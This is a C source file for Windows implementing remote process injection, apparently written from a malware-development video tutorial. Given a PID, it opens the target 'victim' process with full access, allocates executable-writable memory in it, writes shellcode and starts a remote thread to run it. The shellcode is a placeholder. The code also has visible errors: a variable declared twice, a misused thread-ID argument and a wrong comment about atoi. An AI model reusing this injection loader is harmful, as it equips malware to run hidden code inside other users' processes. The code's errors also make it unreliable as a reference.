#include <windows.h>
#include <stdio.h>

/* CREDIT: Pretty much jacked this from cr0w. Go subscribe to his channel
and check out his video, Malware Development II: Process Injection.*/

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

    /* INTENT: To declare the variable which will allocate memory space
    in the victim (injected) process aka Sacrificial process. */
    PVOID allocatedMemorySpace = NULL;

    /* INTENT: To declare the variables for victim ProcessID, ThreadID
    Process Handle and Thread Handle. The IDs must translate to handles
    for Process Injection to work. */
    DWORD victimProcessID = NULL, victimThreadHandle = NULL;
    HANDLE victimProcessHandle = NULL, victimThreadHandle = NULL;

    /* INTENT: To declare the shellcode; the malicious instructions for the
    space of the process in which we inject. Invalid shell code will crash
    the victim process. */
    unsigned char shelly[] =
        "\xDE\xAD\xBE\xEF";

    /* INTENT: To declare the size of the shellcode.*/
    size_t shellySize = sizeof(shelly);

    /* INTENT: Checks for correct usage. */
    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return 1;
    }
    
    /* INTENT: To convert our argument from a process to a string.*/
    victimProcessID = atoi(argv[1]);

    printf("%s trying to get a handle to the process (%ld)\n", i, victimProcessID);

    /* INTENT: Self explanatory.*/
    victimProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victimProcessID);

    if (victimProcessHandle == NULL) {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process\n\\---0x%p\n", k, victimProcessHandle);
    
    /* INTENT: To allocate memory space in the process for our shell code.*/
    allocatedMemorySpace = VirtualAllocEx(victimProcessHandle, NULL, shellySize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, shellySize);

    /* INTENT: To error check the code block above.*/
    if (allocatedMemorySpace == NULL) {
        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    /* INTENT: To injecting our shellcode into the process.*/
    WriteProcessMemory(victimProcessHandle, allocatedMemorySpace, shelly, shellySize, NULL);
    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(shelly));

    /* INTENT: To create the thread which is responsible for running our shellcode. */
    victimThreadHandle = CreateRemoteThreadEx(victimProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemorySpace, NULL, 0, 0, &victimThreadHandle);

    /* INTENT: To error check the code block above.*/
    if (victimThreadHandle == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, victimThreadHandle, victimProcessHandle);

    printf("%s waiting for thread to finish executing\n", i);

    /* INTENT: Like the print statement suggests, waits for the thread to finish. */
    WaitForSingleObject(victimThreadHandle, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    /* INTENT: Self explanatory. */
    CloseHandle(victimThreadHandle);
    CloseHandle(victimProcessHandle);
    printf("%s finished, see you next time :>", k);

    return EXIT_SUCCESS;

}
